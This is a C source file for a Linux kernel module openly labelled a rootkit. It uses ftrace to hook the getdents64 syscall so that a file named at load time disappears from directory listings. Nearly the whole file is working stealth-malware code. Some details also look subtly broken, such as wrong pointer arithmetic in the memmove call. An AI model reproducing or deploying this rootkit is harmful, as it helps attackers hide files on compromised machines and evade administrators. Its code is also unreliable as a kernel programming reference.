#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>


#include "ftrace_helper2.h"



MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


static asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
static asmlinkage int new_getdents64(const struct pt_regs *regs);

static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_getdents64",new_getdents64, &old_getdents64),
 };

char* file_to_hide; 


module_param(file_to_hide, charp, 0000);
MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");



static int __init rootkit_enter(void) {

	unsigned int err;

	printk(KERN_INFO "rootkit is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	if(err)
		return err;

	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");

	return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "module hiding rootkit: stopped\n");

	printk(KERN_INFO "rootkit stopped\n");
}





/*
dirent struct for reference:
// struct linux_dirent64 {
//     u64         d_ino;
//     s64         d_off;
//     unsigned short      d_reclen;
//     unsigned char       d_type;
//     char        d_name[];
// };

iterates over the structs returned by the original getdents64.
If it finds a file name file_to_hide (provided by commandline upon insertion),
it hides it by adding the length of the struct to the length of the previous struct.
when a userspace program iterates over the results of getdents64,
it will do so by adding the d_reclen to the index every iteration.
this will make it miss the hidden file, jumping over it.
*/
asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
	unsigned int len;
	unsigned long index = 0;
	long error;

	dirent = (struct linux_dirent64*)(regs->si); // struct from userspace
	len = old_getdents64(regs); // here struct gets populated by syscall
	dirent_kern = kzalloc(len, GFP_KERNEL); 


	if(dirent_kern <=0 || (dirent_kern == NULL))
		return len;

	error = copy_from_user(dirent_kern, dirent, len); //copy the struct to kernel buffer.
	if (error)
		goto done;
	

	curr_ent = (void*)dirent_kern + index;
	prev_ent = curr_ent;

	while (index < len)
	{
		prev_ent = curr_ent;
		curr_ent = (void*)dirent_kern + index;
		
		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
			printk(KERN_INFO "found secret file: %s",file_to_hide);
			if (index == 0 )// special case
			{
				len -= curr_ent->d_reclen;
				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
			}
			else
			{
				prev_ent->d_reclen += curr_ent->d_reclen;
			}
		}
		index += curr_ent->d_reclen;
	}

	error = copy_to_user(dirent, dirent_kern, len);
	if (error)
		goto done;	

	done:
		kfree(dirent_kern);
		return len;
	
	
}


module_init(rootkit_enter);
module_exit(rootkit_exit);
